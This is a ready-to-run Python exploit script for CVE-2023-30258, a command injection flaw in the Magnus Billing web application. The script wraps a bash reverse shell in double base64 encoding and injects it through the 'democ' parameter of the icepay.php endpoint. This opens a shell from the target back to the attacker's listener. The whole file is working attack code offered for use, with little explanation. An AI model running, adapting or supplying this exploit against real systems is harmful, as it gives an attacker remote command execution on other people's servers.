
---

# 📜 **scr.py (Python Exploit Script)**
#```python
# Edited and Verified by PARAD0X
#!/usr/bin/env python3

import requests
import argparse
import base64

class Magnus:
    def __init__(self, target, lhost, lport):
        self.target = self.check_url(target)
        self.lhost = lhost
        self.lport = lport
        self.exploit()

    def check_url(self, url):
        """Ensure the target URL ends with a slash."""
        return url if url.endswith("/") else url + "/"

    def convert_to_b64(self, payload):
        """Encode payload in base64 twice."""
        return base64.b64encode(base64.b64encode(payload.encode()).decode().encode()).decode()

    def exploit(self):
        """Send the reverse shell payload."""
        requests.packages.urllib3.disable_warnings()

        payload = f"bash -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"
        encoded_payload = self.convert_to_b64(payload)
        target_url = f"{self.target}mbilling/lib/icepay/icepay.php?democ=null;echo {encoded_payload}|base64 -d|base64 -d|sh;null"

        print(f"[+] Target: {self.target}")
        print(f"[+] Sending payload to: {target_url}")
        print("[+] Waiting for reverse shell...")

        try:
            response = requests.get(target_url, verify=False, timeout=10)
            print(f"[+] Response Status Code: {response.status_code}")

            if response.status_code == 200:
                print("[+] Payload sent successfully! Check your listener.")
            elif response.status_code == 404:
                print("[-] Target script not found! Ensure the vulnerable endpoint exists.")
            elif response.status_code == 403:
                print("[-] Access forbidden! A firewall or WAF might be blocking requests.")
            else:
                print(f"[-] Unexpected response: {response.text}")

        except requests.exceptions.ConnectionError:
            print("[-] Connection refused! Target may be down or blocking requests.")
        except requests.exceptions.Timeout:
            print("[-] Request timed out! Target is unresponsive.")
        except Exception as e:
            print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2023-30258 Magnus Billing - Command Injection Exploit")
    parser.add_argument("-t", metavar="<Target URL>", help="Example: -t http://10.10.140.75/", required=True)
    parser.add_argument("-lh", metavar="<Listener IP>", help="Example: -lh 10.21.137.155", required=True)
    parser.add_argument("-lp", metavar="<Listener Port>", help="Example: -lp 1234", required=True)
    args = parser.parse_args()

    try:
        print("[+] CVE-2023-30258 - Exploit for Magnus Billing")
        print("[+] Ensure you have a netcat listener running before executing this script.")
        Magnus(args.t, args.lh, args.lp)
    except KeyboardInterrupt:
        print("\n[!] User interrupted the script. Exiting.")
